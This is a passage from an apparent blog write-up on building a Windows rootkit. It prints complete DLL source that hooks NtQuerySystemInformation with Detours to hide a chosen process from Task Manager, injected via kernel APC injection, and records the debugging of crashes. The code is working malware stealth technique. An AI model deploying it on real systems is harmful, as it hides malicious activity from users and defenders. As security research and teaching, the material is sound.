MB_HELP);<br />    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br />}<br /><br /><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* _NtQuerySystemInformation)</span><span class="hljs-params">(<br />    ULONG SystemInformationClass,<br />    PVOID SystemInformation,<br />    ULONG SystemInformationLength,<br />    PULONG ReturnLength<br />    )</span></span>;<br /><br /><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">HookNtQuerySystemInformation</span><span class="hljs-params">()</span><br /></span>{<br />    ...<br />}<br /><br /><br /><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )</span><br /></span>{<br />    <span class="hljs-built_in">HookNtQuerySystemInformation</span>();<br />    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br />    {<br />    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br />    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br />    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br />    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br />        <span class="hljs-keyword">break</span>;<br />    }<br />    <span class="hljs-keyword">return</span> TRUE;<br />}</span></pre><h4 name="9c94" id="9c94" class="graf graf--h4 graf-after--pre">Hiding our Target Process</h4><p name="33d7" id="33d7" class="graf graf--p graf-after--h4">Now that we have that working and we see that the message box is popping up when the kernel driver is running, we can turn our attention to our main objective: Hiding processes.</p><p name="ad56" id="ad56" class="graf graf--p graf-after--p">For this part, I&#39;m just going back to our .exe version as debugging is a lot easier from here. Then once we are done we can add the updated code to our dll.</p><p name="db0a" id="db0a" class="graf graf--p graf-after--p">So how will we achieve this?:</p><ul class="postList"><li name="c979" id="c979" class="graf graf--li graf-after--p">Update what bytes we save so that we can recreate the original system call</li><li name="0dca" id="0dca" class="graf graf--li graf-after--li">Query original NtQuerySystemInformation()</li><li name="3312" id="3312" class="graf graf--li graf-after--li">Iterate through the returned array of PSYSTEM_PROCESS_INFORMATION structures</li><li name="0a82" id="0a82" class="graf graf--li graf-after--li">Check for the program we wish to hide, in this case “notepad.exe”, if match then update the linked list to remove our entry (similar to what we did in: Appendix B: Process Hiding via Unlinking (DKOM) — FAILED)</li><li name="e1a2" id="e1a2" class="graf graf--li graf-after--li">Return NT_STATUS</li></ul><p name="4cce" id="4cce" class="graf graf--p graf-after--li">First let&#39;s do the functionality of our hooked NtQuerySystemInformation, here a lot of research has already been done and a bunch of code and information was available, I used these sources for reference and stealing. NtQuerySystemInformation call setup [<a href="https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda" data-href="https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">020</a>] and filtering of output [<a href="http://www.rohitab.com/discuss/topic/40323-hide-process-with-ntquerysysteminformation-hook/" data-href="http://www.rohitab.com/discuss/topic/40323-hide-process-with-ntquerysysteminformation-hook/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">021</a>](This one uses SSDT hooking from the kernel — this does not work any longer).</p><p name="8063" id="8063" class="graf graf--p graf-after--p">The code below will call NtQuerySystemInformation and iterate through entries and filter out “notepad.exe”.</p><pre data-code-block-mode="2" spellcheck="false" data-code-block-lang="cpp" name="9b0d" id="9b0d" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)addrNtQuerySystemInformation;<br /><br /><span class="hljs-comment">// Call setup taken from: https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda</span><br /><span class="hljs-comment">// allocate buffer for array of SYSTEM_PROCESS_INFORMATION </span><br /><span class="hljs-comment">// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</span><br />ULONG buffer_length = <span class="hljs-number">0</span>;<br /><span class="hljs-built_in">NtQuerySystemInformation</span>(SystemProcessInformation, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;buffer_length);<br /><br />PVOID buffer = <span class="hljs-built_in">LocalAlloc</span>(<span class="hljs-number">0</span>, buffer_length);<br /><span class="hljs-comment">// Get result and put in buffer</span><br />NTSTATUS status = <span class="hljs-built_in">NtQuerySystemInformation</span>(SystemProcessInformation, buffer, buffer_length, &amp;buffer_length);<br /><br /><span class="hljs-comment">// taken from: http://www.rohitab.com/discuss/topic/40323-hide-process-with-ntquerysysteminformation-hook/</span><br /><span class="hljs-comment">// Check for successfull execution</span><br /><span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">NT_SUCCESS</span>(status))) {<br />    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br />}<br /><br /><span class="hljs-comment">// Iterate over array containing process information</span><br />PSYSTEM_PROCESS_INFO pCurr, pNext;<br />pCurr = <span class="hljs-literal">NULL</span>;<br />pNext = (PSYSTEM_PROCESS_INFO)buffer;<br /><span class="hljs-keyword">while</span> (pNext-&gt;NextEntryOffset != <span class="hljs-number">0</span>) {<br />  <span class="hljs-comment">// update variables using next entry</span><br />  pCurr = pNext;<br />  pNext = (PSYSTEM_PROCESS_INFO)((PUCHAR)pCurr + pCurr-&gt;NextEntryOffset);<br />  <span class="hljs-comment">// check for match, if not matching just continue iterating</span><br />  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wcscmp</span>(<span class="hljs-string">L&quot;notepad.exe&quot;</span>, pNext-&gt;ImageName.Buffer))<br />    {<br />      <span class="hljs-keyword">if</span> (pNext-&gt;NextEntryOffset == <span class="hljs-number">0</span>)<br />        {<br />          pCurr-&gt;NextEntryOffset = <span class="hljs-number">0</span>;<br />        }<br />        <span class="hljs-keyword">else</span><br />        {<br />          <span class="hljs-comment">// we are matching our target process and to hide it we just modify the previous entry to point to the next</span><br />          <span class="hljs-comment">// more or less jsut the same as we tried with DKOM</span><br />          pCurr-&gt;NextEntryOffset += pNext-&gt;NextEntryOffset;<br />        }<br /><br />        pNext = pCurr;<br />      }<br />    }<br /><span class="hljs-keyword">return</span> status;</span></pre><p name="579a" id="579a" class="graf graf--p graf-after--pre">Now the next question is: How will we call NtQuerySystemInformation if we have just hooked the function and redirected the execution flow? Good question, let´s see if we can find an answer.</p><p name="28cd" id="28cd" class="graf graf--p graf-after--p">First, we need to make some changes to our code since it is being called with parameters from another process, so we need to use these parameters when we are calling NtQuerySystemInformation.</p><p name="d95b" id="d95b" class="graf graf--p graf-after--p">Instead of relying on the above implementation of hooking MS detrous can also be used, this has the preferable trait of being well tested and having plenty of documentation! and we now know how it works in practice and can create a custom version if needed! To set up MS Detours see this article [<a href="https://blog.securehat.co.uk/process-injection/detecting-process-injection-using-microsoft-detour-hooks" data-href="https://blog.securehat.co.uk/process-injection/detecting-process-injection-using-microsoft-detour-hooks" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">022</a>].</p><p name="388e" id="388e" class="graf graf--p graf-after--p">So here I had some issues with getting the previous code working when injecting it into the task manager, and instead of spending a bunch of time to refine and debug my approach I just “got inspired” (aka ctrl c + ctrl+v) something that already worked and used that instead. Please refer to this post for code and further explanation:</p><div name="4822" id="4822" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://medium.com/@s12deff/hide-processes-in-task-manager-64043c7c2c4b" data-href="https://medium.com/@s12deff/hide-processes-in-task-manager-64043c7c2c4b" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://medium.com/@s12deff/hide-processes-in-task-manager-64043c7c2c4b"><strong class="markup--strong markup--mixtapeEmbed-strong">Hide Processes in Task Manager</strong><br><em class="markup--em markup--mixtapeEmbed-em">Welcome to my new article today i will show you how i created a basic DLL to implement a rootkit user mode technique to…</em>medium.com</a><a href="https://medium.com/@s12deff/hide-processes-in-task-manager-64043c7c2c4b" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="38589337f56bcc9a8513f29b2d1f0cab" data-thumbnail-img-id="1*wS99x8kuMhnZ8Tlmekh2JA.png" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/1*wS99x8kuMhnZ8Tlmekh2JA.png);"></a></div><figure name="d3c0" id="d3c0" class="graf graf--figure graf-after--mixtapeEmbed"><img class="graf-image" data-image-id="1*1Sbk0V0frDZK964-jXkL-w.gif" data-width="1145" data-height="864" src="https://cdn-images-1.medium.com/max/800/1*1Sbk0V0frDZK964-jXkL-w.gif"><figcaption class="imageCaption">Working process hiding with dll injection</figcaption></figure><p name="76ae" id="76ae" class="graf graf--p graf-after--figure">And it works, we do however notice that when new notepad processes are created they are not hidden in taskmgr. so let&#39;s see if we can figure out what going on.</p><p name="7154" id="7154" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Problem #1 Not all processes are hidden</strong></p><p name="b8f0" id="b8f0" class="graf graf--p graf-after--p">looking in x64dbg we see that the function is hooked so let&#39;s try setting a breakpoint and see what happens</p><figure name="f9ad" id="f9ad" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*ard1LCXyoPgB4NBdw18AMA.png" data-width="639" data-height="74" src="https://cdn-images-1.medium.com/max/800/1*ard1LCXyoPgB4NBdw18AMA.png"><figcaption class="imageCaption">Hooking using Detours. Notice these look a bit different than our custom hooks</figcaption></figure><p name="1860" id="1860" class="graf graf--p graf-after--figure">First, we try setting a breakpoint on the function, and now when creating new notepad processes, we don&#39;t hit the break point and the processes do now show up in taskmgr. Also if we wait for a while without the debugger, the processes disappear from taskmgr without being closed. I suspect that this behaviour happens due to multiple different threads running and only one of these is being hooked. To test this let&#39;s use our debugger to start the process as suspended, and then inject our dll into it before resuming execution. And now everything works as it should!</p><p name="4def" id="4def" class="graf graf--p graf-after--p">Now let&#39;s try it with our KAPC injection! and it does not work …</p><p name="b301" id="b301" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Problem #2 Taskmgr crashing</strong></p><p name="0615" id="0615" class="graf graf--p graf-after--p">The first problem is that taskmgr opens and then before showing any processes closes down again. Sounds like something is wrong with our dll? Let&#39;s load up a debugger and see if we can figure out what is happening.</p><p name="e41d" id="e41d" class="graf graf--p graf-after--p">Looks like we are getting an access violation.</p><figure name="b4a4" id="b4a4" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*Rm3L-tg80gFm_JHxU4RCKw.png" data-width="545" data-height="210" src="https://cdn-images-1.medium.com/max/800/1*Rm3L-tg80gFm_JHxU4RCKw.png"><figcaption class="imageCaption">Access violation in MyDLL</figcaption></figure><p name="ae59" id="ae59" class="graf graf--p graf-after--figure">Let&#39;s check dll load</p><figure name="df3f" id="df3f" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*dpd3ILZkLhybjYkQMnfULA.png" data-width="432" data-height="272" src="https://cdn-images-1.medium.com/max/800/1*dpd3ILZkLhybjYkQMnfULA.png"></figure><figure name="6e31" id="6e31" class="graf graf--figure graf-after--figure"><img class="graf-image" data-image-id="1*i47Amf69YVxGwAIFTxMzyQ.png" data-width="421" data-height="25" src="https://cdn-images-1.medium.com/max/800/1*i47Amf69YVxGwAIFTxMzyQ.png"></figure><p name="3c69" id="3c69" class="graf graf--p graf-after--figure">stepping through the loads, we get this</p><figure name="4b4a" id="4b4a" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*eP-iQPbMoULhKGXhCUFCag.png" data-width="597" data-height="125" src="https://cdn-images-1.medium.com/max/800/1*eP-iQPbMoULhKGXhCUFCag.png"></figure><p name="75db" id="75db" class="graf graf--p graf-after--figure">Might be because we are building the dll in debug mode? Let&#39;s continue</p><p name="f77c" id="f77c" class="graf graf--p graf-after--p">Looking further we see that the exception is happening in our HookedNtQuerySystemInformation function</p><figure name="83b0" id="83b0" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*PNvS3EF_HQvpyGfo5qHpRQ.png" data-width="873" data-height="275" src="https://cdn-images-1.medium.com/max/800/1*PNvS3EF_HQvpyGfo5qHpRQ.png"></figure><figure name="4ee4" id="4ee4" class="graf graf--figure graf-after--figure"><img class="graf-image" data-image-id="1*yPl0r_GEQrbG3-BJwUVbyw.png" data-width="868" data-height="388" src="https://cdn-images-1.medium.com/max/800/1*yPl0r_GEQrbG3-BJwUVbyw.png"></figure><p name="5788" id="5788" class="graf graf--p graf-after--figure">Looking a bit further at the resulting area, we see that the exception happens somewhere before our string match for “notepad.exe”</p><figure name="3525" id="3525" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*MRe-gxNrxLTCXtJt5mm6bQ.png" data-width="875" data-height="140" src="https://cdn-images-1.medium.com/max/800/1*MRe-gxNrxLTCXtJt5mm6bQ.png"></figure><p name="e2ea" id="e2ea" class="graf graf--p graf-after--figure">Looking back we also saw vcruntime being loaded.., which happens when the binary is not compiled for release.</p><p name="2bbd" id="2bbd" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Hypothesis 1: dll does not work because it&#39;s compiled as debug</strong></p><p name="b443" id="b443" class="graf graf--p graf-after--p">To test this we simply compile in release mode and test, after doing that we still get the same exception.</p><p name="20be" id="20be" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Hypothesis #2: something weird is happening when checking the buffer and causing an exception.</strong></p><p name="f812" id="f812" class="graf graf--p graf-after--p">To test this let&#39;s try compiling the application without “pCurrent-&gt;ImageName.Buffer != NULL”</p><p name="ad41" id="ad41" class="graf graf--p graf-after--p">That also does not work and we are still getting a bunch of ACCESS VIOLATION ERRORS</p><p name="6e99" id="6e99" class="graf graf--p graf-after--p">Still does not work.</p><p name="067e" id="067e" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Hypothesis #3: Something is going wrong with the validation logic</strong></p><p name="fcb4" id="fcb4" class="graf graf--p graf-after--p">after commenting out all of the logic and just looping through the structure everything looks like it is working fine, however, no processes are being shown. So let&#39;s line by line add back the logic and see when we get an error. and then troubleshoot from there.</p><p name="9437" id="9437" class="graf graf--p graf-after--p">After adding and removing more or less all lines in the application it looks like the errors happen when trying to access the attributes of the structure such as:</p><pre data-code-block-mode="2" spellcheck="false" data-code-block-lang="cpp" name="81f9" id="81f9" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">pCurrent-&gt;ImageName.Buffer </span></pre><p name="449b" id="449b" class="graf graf--p graf-after--pre">Doing some more digging we see that the issue happens when trying to access the parameters of PSYSTEM_PROCESS_INFORMATION… this leads nowhere.</p><p name="77eb" id="77eb" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Hypothesis #4: We are crashing due to access violations, maybe some of the data accessed is NULL</strong></p><p name="0443" id="0443" class="graf graf--p graf-after--p">After spending way too much time messing around with the DLL, and adding the following check, it now works! Before the dll would cause the task manager to crash, I assumed that SystemInformation would be null and thus causing the access violation above. To test this we create a check to test if “SystemInformation” is NULL.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="e838" id="e838" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">if</span>(SystemInformation == <span class="hljs-literal">NULL</span>) {<br />    <span class="hljs-keyword">return</span> status;<br />}</span></pre><figure name="0e64" id="0e64" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*A2Fw9F3A0-_QCSnAhBIgkw.png" data-width="481" data-height="365" src="https://cdn-images-1.medium.com/max/800/1*A2Fw9F3A0-_QCSnAhBIgkw.png"><figcaption class="imageCaption">Test works and we now detect notepad</figcaption></figure><p name="58b5" id="58b5" class="graf graf--p graf-after--figure">And it now works, and notepad is hidden… but only when notepad is open before Task Manager is launched</p><figure name="c7ea" id="c7ea" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*YSGGSdXhSwNq8OV0aQ8_Yw.png" data-width="614" data-height="282" src="https://cdn-images-1.medium.com/max/800/1*YSGGSdXhSwNq8OV0aQ8_Yw.png"><figcaption class="imageCaption">Notepad is now hidden</figcaption></figure><p name="0313" id="0313" class="graf graf--p graf-after--figure">Since we are assuming that our rootkit will be running and starting on startup I choose to leave finding a way to hide new processes for another day. For sure this is still relevant, but the post is getting very long already. So let&#39;s get this wrapped up!</p><figure name="8e76" id="8e76" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*nUjqCC0IMB-fmm7Lu6i5HQ.gif" data-width="1145" data-height="855" src="https://cdn-images-1.medium.com/max/800/1*nUjqCC0IMB-fmm7Lu6i5HQ.gif"><figcaption class="imageCaption">KAPC injection used to inject Dll in taskmgr.exe and hide notepad.exe</figcaption></figure><p name="ceb6" id="ceb6" class="graf graf--p graf-after--figure">The final Dll ended up looking like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="94e8" id="94e8" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;shlwapi.h&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;detours.h&quot;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Winternl.h&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br /><br /><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtQuerySystemInformation_t)</span><span class="hljs-params">(<br />    SYSTEM_INFORMATION_CLASS SystemInformationClass,<br />    PVOID SystemInformation,<br />    ULONG SystemInformationLength,<br />    PULONG ReturnLength<br />    )</span></span>;<br /><br />NtQuerySystemInformation_t origNtQuerySystemInformation = <span class="hljs-literal">NULL</span>;<br /><br /><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">HookedNtQuerySystemInformation</span><span class="hljs-params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)</span> </span>{<br />    NTSTATUS status = <span class="hljs-built_in">origNtQuerySystemInformation</span>(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);<br /><br />    <span class="hljs-keyword">if</span> (SystemInformationClass == SystemProcessInformation) {<br />        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;<br />        PSYSTEM_PROCESS_INFORMATION pPrevious = <span class="hljs-literal">NULL</span>; <br />        <br />        <span class="hljs-keyword">if</span>(SystemInformation == <span class="hljs-literal">NULL</span>) {<br />            <span class="hljs-keyword">return</span> status;<br />        }<br />        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {<br />            <span class="hljs-keyword">if</span> (pCurrent-&gt;ImageName.Buffer != <span class="hljs-literal">NULL</span> &amp;&amp;<br />                <span class="hljs-built_in">wcsstr</span>(pCurrent-&gt;ImageName.Buffer, <span class="hljs-string">L&quot;notepad.exe&quot;</span>) != <span class="hljs-literal">NULL</span>) {<br />                <span class="hljs-keyword">if</span> (pPrevious == <span class="hljs-literal">NULL</span>) {<br />                    pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent-&gt;NextEntryOffset);<br />                    <span class="hljs-keyword">if</span> (pCurrent-&gt;NextEntryOffset != <span class="hljs-number">0</span>) {<br />                        <span class="hljs-built_in">memmove</span>(pPrevious, pCurrent, (PCHAR)pCurrent - (PCHAR)pPrevious);<br />                        pCurrent = pPrevious;<br />                    }<br />                    <span class="hljs-keyword">else</span> {<br />                        pPrevious-&gt;NextEntryOffset = <span class="hljs-number">0</span>;<br />                    }<br />                }<br />                <span class="hljs-keyword">else</span> {<br />                    pPrevious-&gt;NextEntryOffset += pCurrent-&gt;NextEntryOffset;<br />                }<br />            }<br />            <span class="hljs-keyword">if</span> (pCurrent-&gt;NextEntryOffset == <span class="hljs-number">0</span>) {<br />                <span class="hljs-keyword">break</span>;<br />            }<br />            pPrevious = pCurrent;<br />            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent-&gt;NextEntryOffset);<br />        }<br />    }<br />    <span class="hljs-keyword">return</span> status;<br />}<br /><br /><br /><br /><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span> </span>{<br />    <span class="hljs-keyword">switch</span> (ul_reason_for_call) {<br />    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br />        origNtQuerySystemInformation = (NtQuerySystemInformation_t)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br />        <span class="hljs-built_in">DetourTransactionBegin</span>();<br />        <span class="hljs-built_in">DetourUpdateThread</span>(<span class="hljs-built_in">GetCurrentThread</span>());<br />        <span class="hljs-built_in">DetourAttach</span>(&amp;(PVOID&amp;)origNtQuerySystemInformation, HookedNtQuerySystemInformation);<br />        <span class="hljs-built_in">DetourTransactionCommit</span>();<br />        <span class="hljs-keyword">break</span>;<br /><br />    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br />        <span class="hljs-built_in">DetourTransactionBegin</span>();<br />        <span class="hljs-built_in">DetourUpdateThread</span>(<span class="hljs-built_in">GetCurrentThread</span>());<br />        <span class="hljs-built_in">DetourDetach</span>(&amp;(PVOID&amp;)origNtQuerySystemInformation, HookedNtQuerySystemInformation);<br />        <span class="hljs-built_in">DetourTransactionCommit</span>();<br />        <span class="hljs-keyword">break</span>;<br /><br />    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br />    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br />        <span class="hljs-keyword">break</span>;<br />    }<br /><br />    <span class="hljs-keyword">return</span> TRUE;<br />}</span></pre><h3 name="19c2" id="19c2" class="graf graf--h3 graf-after--pre">Conclusion</h3><p name="0e20" id="0e20" class="graf graf--p graf-after--h3">It has been a long road getting here and taken a couple of months of on-and-off work to get here in conclusion we have gone a long way and spent, a lot of time researching and messing around before finally getting kernel APC (KAPC) injection working. Then came a bit of struggling to get our hooking dll to work. In the end, we are able to inject Dll’s into any process we want on a system and use these to hide processes we want etc. In an upcoming post, we will be expanding on this to get further evasion working to hide other of our artefacts on the system like registry keys, services, and files.</p><h3 name="b478" id="b478" class="graf graf--h3 graf-after--p">Lessons learned</h3><p name="46b3" id="46b3" class="graf graf--p graf-after--h3">So what have we learned?… a bunch</p><ul class="postList"><li name="5937" id="5937" class="graf graf--li graf-after--p">We learned a shit ton about APC injection and Kernel APC injection</li><li name="8e81" id="8e81" class="graf graf--li graf-after--li">We learned the process of creating a hook in a function, and how to use this hook to essentially filter out information.</li><li name="f1e2" id="f1e2" class="graf graf--li graf-after--li">We also learnt how to create our own custom hooks from scratch, and how to use MS detours to do the work for us</li><li name="adc9" id="adc9" class="graf graf--li graf-after--li">Out c++ knowledge and Windows internals knowledge have also gotten a lot better</li><li name="7865" id="7865" class="graf graf--li graf-after--li">We also learned about Windows defensive mechanisms like patch guard and how it nukes Direct Kernel Object Modification (DKOM)</li><li name="f3b0" id="f3b0" class="graf graf--li graf-after--li">Finally, we learnt a lot of how to debug and bugfix for code where we can&#39;t just use the Visual Studio debugger.</li></ul><h3 name="e8fc" id="e8fc" class="graf graf--h3 graf-after--li">References:</h3><ul class="postList"><li name="856f" id="856f" class="graf graf--li graf-after--h3"><strong class="markup--strong markup--li-strong">[000] Let&#39;s Create An EDR… And Bypass It! Part 1:</strong> <a href="https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/" data-href="https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/</a></li><li name="00d0" id="00d0" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[001] Evading EDR:</strong> <a href="https://nostarch.com/evading-edr" data-href="https://nostarch.com/evading-edr" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://nostarch.com/evading-edr</a> — a great book on the functionality and internals of EDR software and how this can be bypassed</li><li name="b39a" id="b39a" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[002] Kernel to User land: APC injection:</strong> <a href="https://wikileaks.org/ciav7p1/cms/page_7995519.html" data-href="https://wikileaks.org/ciav7p1/cms/page_7995519.html" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://wikileaks.org/ciav7p1/cms/page_7995519.html</a> — Good explanation of KAPC injection</li><li name="2ba9" id="2ba9" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[xxx]</strong> <a href="https://github.com/0xOvid/RootkitDiaries/tree/main/KAPC_Injection" data-href="https://github.com/0xOvid/RootkitDiaries/tree/main/KAPC_Injection" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/0xOvid/RootkitDiaries/tree/main/KAPC_Injection</a> — My GitHub with code used in the project</li><li name="e06e" id="e06e" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[003] KERNEL INJECTION CODE BY REVERSING SIRIFEF AKA MAX++ INFAMOUS ROOTKIT:</strong> <a href="https://alexvogtkernel.blogspot.com/2018/09/kernel-injection-code-reversing-sirifef.html" data-href="https://alexvogtkernel.blogspot.com/2018/09/kernel-injection-code-reversing-sirifef.html" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://alexvogtkernel.blogspot.com/2018/09/kernel-injection-code-reversing-sirifef.html</a> — the best explanation and demo of KAPC injection that I was able to find</li><li name="48e9" id="48e9" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[004]</strong> <a href="https://github.com/alexvogt91/Kernel-dll-injector/blob/master/Sirifef/Sirifef/Sf.c" data-href="https://github.com/alexvogt91/Kernel-dll-injector/blob/master/Sirifef/Sirifef/Sf.c" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/alexvogt91/Kernel-dll-injector/blob/master/Sirifef/Sirifef/Sf.c</a> — GitHub with code from the previous article</li><li name="7bd2" id="7bd2" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[005]</strong> <a href="https://github.com/wbenny/injdrv/blob/master/README.md" data-href="https://github.com/wbenny/injdrv/blob/master/README.md" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/wbenny/injdrv/blob/master/README.md</a> — another example of KAPC injection</li><li name="e28b" id="e28b" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[006]</strong> <a href="https://github.com/ChengChengCC/Ark-tools/blob/046474e4b53e674405bc94d75d3a28a732839b96/Inject_By_kernelAPC/ring0/KeInjectApc.c" data-href="https://github.com/ChengChengCC/Ark-tools/blob/046474e4b53e674405bc94d75d3a28a732839b96/Inject_By_kernelAPC/ring0/KeInjectApc.c" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/ChengChengCC/Ark-tools/blob/046474e4b53e674405bc94d75d3a28a732839b96/Inject_By_kernelAPC/ring0/KeInjectApc.c</a> — another example of KAPC injection</li><li name="baaf" id="baaf" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[007]</strong> <a href="https://github.com/adrianyy/KeInject/tree/master" data-href="https://github.com/adrianyy/KeInject/tree/master" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/adrianyy/KeInject/tree/master</a> — another example of KAPC injection</li><li name="df23" id="df23" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[008]</strong> <a href="https://github.com/Rhydon1337/windows-kernel-dll-injector/tree/main" data-href="https://github.com/Rhydon1337/windows-kernel-dll-injector/tree/main" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/Rhydon1337/windows-kernel-dll-injector/tree/main</a> — another example of KAPC injection</li><li name="083e" id="083e" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[009] </strong><a href="https://github.com/OlSut/Kinject-x64" data-href="https://github.com/OlSut/Kinject-x64" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/OlSut/Kinject-x64</a> — another example of KAPC injection</li><li name="6449" id="6449" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[010] Aspects of internals of the Asynchronous Procedure Calls from the kernel mode.:</strong> <a href="https://dennisbabkin.com/blog/?t=depths-of-windows-apc-aspects-of-asynchronous-procedure-call-internals-from-kernel-mode#apc_demo" data-href="https://dennisbabkin.com/blog/?t=depths-of-windows-apc-aspects-of-asynchronous-procedure-call-internals-from-kernel-mode#apc_demo" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://dennisbabkin.com/blog/?t=depths-of-windows-apc-aspects-of-asynchronous-procedure-call-internals-from-kernel-mode#apc_demo</a></li><li name="cf1c" id="cf1c" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[011] Making the Visual Studio solution for DLL injection into all running processes.:</strong> <a href="https://dennisbabkin.com/blog/?i=AAA10800" data-href="https://dennisbabkin.com/blog/?i=AAA10800" 